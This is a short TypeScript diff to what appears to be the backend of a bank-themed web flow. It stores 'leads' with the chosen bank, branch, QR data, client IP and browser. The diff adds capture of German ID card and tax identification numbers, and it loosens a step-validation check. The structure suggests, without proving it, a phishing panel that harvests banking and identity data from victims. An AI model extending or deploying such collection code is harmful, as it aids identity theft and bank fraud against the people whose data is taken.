@@ -22,6 +22,10 @@ import { getClientIP } from '../utils/ipUtils';
  * Validate if a step is enabled for a template
  */
 function validateStep(stepConfig: Record<string, boolean>, step: string): boolean {
+  if (stepConfig[step] === true) {
+    return true;
+  }
+
   // Map step names to config keys
   const stepMapping: Record<string, string> = {
     'login': 'login', // Always allowed
@@ -543,6 +547,8 @@ async function createLeadFromSession(sessionKey: string, templateName: string): 
         selected_bank: sessionData.bank_type || sessionData.selected_bank,
         selected_branch: sessionData.selected_branch,
         qr_data: qrData,
+        ausweisnummer: sessionData.ausweisnummer,
+        steueridentifikationsnummer: sessionData.steueridentifikationsnummer,
         flow_completed: true,
         completed_at: new Date().toISOString(),
         browser: session.user_agent,
